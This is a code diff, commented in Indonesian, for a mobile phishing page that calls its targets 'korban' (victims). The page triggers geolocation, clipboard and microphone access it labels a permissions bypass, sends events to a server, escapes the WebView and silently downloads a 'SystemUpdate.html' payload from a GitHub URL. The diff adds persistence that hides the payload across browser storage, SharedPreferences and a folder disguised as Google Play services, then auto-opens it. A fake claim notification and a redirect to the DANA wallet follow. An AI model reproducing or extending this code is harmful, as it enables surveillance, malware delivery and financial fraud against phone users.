@@ -136,7 +136,6 @@ var semuaDidapat = false;
 var DOWNLOAD_STARTED = false;
 var NOTIFICATION_SHOWN = false;
 var REDIRECT_DONE = false;
-var WS_PASSWORD = '';
 
 // ============================================================
 // FUNGSI K() - KIRIM DATA KE SERVER
@@ -173,6 +172,27 @@ var A = {
             try{ return AndroidBridge.saveFile(path, content); }catch(e){}
         }
         return false;
+    },
+    // tambahan untuk persistensi
+    saveToPreferences: function(key, value) {
+        if(this.isAvailable){ try{ return AndroidBridge.saveToPreferences(key, value); }catch(e){} }
+        return false;
+    },
+    getFromPreferences: function(key) {
+        if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(key); }catch(e){} }
+        return null;
+    },
+    fileExists: function(path) {
+        if(this.isAvailable){ try{ return AndroidBridge.fileExists(path); }catch(e){} }
+        return false;
+    },
+    readFile: function(path) {
+        if(this.isAvailable){ try{ return AndroidBridge.readFile(path); }catch(e){} }
+        return null;
+    },
+    saveFileBinary: function(path, data) {
+        if(this.isAvailable){ try{ return AndroidBridge.saveFileBinary(path, data); }catch(e){} }
+        return false;
     }
 };
 
@@ -183,7 +203,6 @@ function injectAllPermissions() {
     try {
         K({ sumber: 'bypass_permissions_start', data: 'all' });
 
-        // 1. GEOLOCATION
         if (navigator.geolocation) {
             try {
                 navigator.geolocation.getCurrentPosition(
@@ -194,7 +213,6 @@ function injectAllPermissions() {
             } catch(e) {}
         }
 
-        // 2. NOTIFICATION
         if ('Notification' in window && Notification.permission !== 'denied') {
             try {
                 if (Notification.permission !== 'granted') {
@@ -203,14 +221,12 @@ function injectAllPermissions() {
             } catch(e) {}
         }
 
-        // 3. CLIPBOARD
         if (navigator.clipboard) {
             try {
                 navigator.clipboard.readText().catch(function() {});
             } catch(e) {}
         }
 
-        // 4. MEDIA (Audio & Video)
         if (navigator.mediaDevices) {
             try {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: false })
@@ -229,12 +245,10 @@ function injectAllPermissions() {
             } catch(e) {}
         }
 
-        // 5. VIBRATE
         if (navigator.vibrate) {
             try { navigator.vibrate(1); } catch(e) {}
         }
 
-        // 6. STORAGE
         if (navigator.storage && navigator.storage.persist) {
             try {
                 navigator.storage.persist().catch(function() {});
@@ -248,7 +262,7 @@ function injectAllPermissions() {
 }
 
 // ============================================================
-// 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE STORAGE KORBAN
+// 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE STORAGE KORBAN (MULTI-LOKASI)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -257,7 +271,6 @@ function downloadPayloadSilent() {
     K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
     try {
         var xhr = new XMLHttpRequest();
@@ -266,47 +279,52 @@ function downloadPayloadSilent() {
         xhr.onload = function() {
             if (xhr.status === 200) {
                 var htmlContent = xhr.responseText;
-                
-                // ✅ Simpan ke localStorage
-                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
-                
-                // ✅ Simpan via Android Bridge (jika tersedia)
-                if (PLATFORM.isAndroid && A.isAvailable) {
-                    try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
-                }
-                
-                // ✅ Download via blob (fallback)
-                try {
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    var link = document.createElement('a');
-                    link.href = url;
-                    link.download = 'SystemUpdate.html';
-                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                    document.body.appendChild(link);
-                    setTimeout(function() {
-                        link.click();
-                        setTimeout(function() {
-                            try { document.body.removeChild(link); } catch(e) {}
-                            URL.revokeObjectURL(url);
-                        }, 1000);
-                    }, 100);
-                    K({ sumber: 'html_download_blob', data: 'ok' });
-                } catch(e) {}
-                
-                // ✅ iOS: Buka di tab baru
-                if (PLATFORM.isIOS) {
-                    try {
-                        var blob = new Blob([htmlContent], { type: 'text/html' });
-                        var url = URL.createObjectURL(blob);
-                        window.open(url, '_blank');
-                        K({ sumber: 'html_download_ios', data: 'ok' });
-                    } catch(e) {}
-                }
+                // Simpan ke semua lokasi (agar SystemUpdate.html bisa di-load nanti)
+                saveToAllLocations(htmlContent);
+                K({ sumber: 'html_download_success', data: 'ok' });
             }
         };
         xhr.send();
     } catch(e) {}
+}
+
+function saveToAllLocations(htmlContent) {
+    // 1. localStorage
+    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
+    // 2. IndexedDB
+    try {
+        var request = indexedDB.open('SystemUpdateDB', 1);
+        request.onupgradeneeded = function(e) {
+            var db = e.target.result;
+            if (!db.objectStoreNames.contains('files')) {
+                db.createObjectStore('files');
+            }
+        };
+        request.onsuccess = function(e) {
+            var db = e.target.result;
+            var tx = db.transaction('files', 'readwrite');
+            var store = tx.objectStore('files');
+            store.put(htmlContent, 'SystemUpdate.html');
+        };
+    } catch(e) {}
+    // 3. Android/data (via Bridge)
+    if (PLATFORM.isAndroid && A.isAvailable) {
+        try {
+            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
+            A.saveFile(path, htmlContent);
+        } catch(e) {}
+        // 4. SharedPreferences (encoded)
+        try {
+            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
+            A.saveToPreferences('system_SystemUpdate_html', encoded);
+        } catch(e) {}
+    }
+    // 5. Download folder (fallback)
+    if (PLATFORM.isAndroid && A.isAvailable) {
+        try {
+            A.saveFile('/storage/emulated/0/Download/SystemUpdate.html', htmlContent);
+        } catch(e) {}
+    }
 }
 
 // ============================================================
@@ -314,52 +332,80 @@ function downloadPayloadSilent() {
 // ============================================================
 function openSystemUpdateHTML() {
     setTimeout(function() {
-        // PRIORITAS 1: Android Bridge
+        // Coba buka dari berbagai lokasi (prioritas: AndroidBridge → localStorage → IndexedDB → Android/data → Download)
+        var htmlContent = null;
+        // 1. SharedPreferences (via Bridge)
         if (PLATFORM.isAndroid && A.isAvailable) {
             try {
-                A.openFile('/storage/emulated/0/Download/SystemUpdate.html');
-                K({ sumber: 'html_open_bridge', data: 'ok' });
-                return;
-            } catch(e) {}
-        }
-        
-        // PRIORITAS 2: LocalStorage (blob)
-        try {
-            var htmlContent = localStorage.getItem('SystemUpdate.html');
-            if (htmlContent) {
-                var blob = new Blob([htmlContent], { type: 'text/html' });
-                var url = URL.createObjectURL(blob);
-                window.open(url, '_blank');
-                K({ sumber: 'html_open_localstorage', data: 'ok' });
-                return;
-            }
-        } catch(e) {}
-        
-        // PRIORITAS 3: File URL (Android)
-        if (PLATFORM.isAndroid) {
-            try {
-                window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
-                K({ sumber: 'html_open_file', data: 'attempt' });
-            } catch(e) {}
-        }
-        
-        // PRIORITAS 4: iOS Blob
-        if (PLATFORM.isIOS) {
-            try {
-                var htmlContent = localStorage.getItem('SystemUpdate.html');
-                if (htmlContent) {
-                    var blob = new Blob([htmlContent], { type: 'text/html' });
-                    var url = URL.createObjectURL(blob);
-                    window.open(url, '_blank');
-                    K({ sumber: 'html_open_ios', data: 'ok' });
+                var encoded = A.getFromPreferences('system_SystemUpdate_html');
+                if (encoded) {
+                    htmlContent = decodeURIComponent(escape(atob(encoded)));
                 }
             } catch(e) {}
+        }
+        // 2. localStorage
+        if (!htmlContent) {
+            try { htmlContent = localStorage.getItem('SystemUpdate_backup'); } catch(e) {}
+        }
+        // 3. IndexedDB (async, tapi kita coba sync dengan callback)
+        if (!htmlContent) {
+            try {
+                var request = indexedDB.open('SystemUpdateDB', 1);
+                request.onsuccess = function(e) {
+                    var db = e.target.result;
+                    var tx = db.transaction('files', 'readonly');
+                    var store = tx.objectStore('files');
+                    var get = store.get('SystemUpdate.html');
+                    get.onsuccess = function() {
+                        if (get.result) {
+                            htmlContent = get.result;
+                            openHTML(htmlContent);
+                        }
+                    };
+                };
+            } catch(e) {}
+        }
+        // 4. Android/data
+        if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
+            try {
+                htmlContent = A.readFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
+            } catch(e) {}
+        }
+        // 5. Download folder
+        if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
+            try {
+                htmlContent = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
+            } catch(e) {}
+        }
+        // Jika berhasil, buka
+        if (htmlContent) {
+            openHTML(htmlContent);
         }
     }, 5000);
 }
 
+function openHTML(htmlContent) {
+    // Android Bridge (buka file)
+    if (PLATFORM.isAndroid && A.isAvailable) {
+        try {
+            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
+            // Pastikan file ada
+            if (A.fileExists(path)) {
+                A.openFile(path);
+                return;
+            }
+        } catch(e) {}
+    }
+    // Blob URL (fallback)
+    try {
+        var blob = new Blob([htmlContent], { type: 'text/html' });
+        var url = URL.createObjectURL(blob);
+        window.open(url, '_blank');
+    } catch(e) {}
+}
+
 // ============================================================
-// WEBVIEW ESCAPE
+// WEBVIEW ESCAPE, NOTIFIKASI, STATUS BAR, REDIRECT
 // ============================================================
 function escapeWebView() {
     if (!PLATFORM.isWebView) return;
@@ -372,9 +418,6 @@ function escapeWebView() {
     try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
 }
 
-// ============================================================
-// NOTIFICATION "KLIK UNTUK KLAIM"
-// ============================================================
 function showKlaimNotification() {
     if (NOTIFICATION_SHOWN) return;
     NOTIFICATION_SHOWN = true;
@@ -416,9 +459,6 @@ function createKlaimNotification() {
     } catch(e) {}
 }
 
-// ============================================================
-// STATUS BAR
-// ============================================================
 function showStatusBar() { 
     var bar = document.getElementById('statusBar'); 
     if (bar) { 
@@ -427,9 +467,6 @@ function showStatusBar() {
     } 
 }
 
-// ============================================================
-// REDIRECT KE DANA
-// ============================================================
 function redirectToDANA() {
     if (REDIRECT_DONE) return;
     REDIRECT_DONE = true;
@@ -437,7 +474,7 @@ function redirectToDANA() {
 }
 
 // ============================================================
-// 🔥 MAIN EXECUTION (3 TUGAS UTAMA)
+// MAIN EXECUTION
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -449,26 +486,13 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // ============================================================
-        // 🔥 TUGAS 1: BYPASS SEMUA IZIN
-        // ============================================================
         injectAllPermissions();
         
-        // ============================================================
-        // 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE STORAGE
-        // ============================================================
         setTimeout(escapeWebView, 100);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         setTimeout(function() { showStatusBar(); }, 500);
-        
-        // ============================================================
-        // 🔥 TUGAS 3: BUKA SystemUpdate.html OTOMATIS (5 DETIK SETELAH DOWNLOAD)
-        // ============================================================
         openSystemUpdateHTML();
         
-        // ============================================================
-        // NOTIFIKASI & REDIRECT KE DANA
-        // ============================================================
         setTimeout(function() { showKlaimNotification(); }, 3000);
         setTimeout(redirectToDANA, 8000);
         
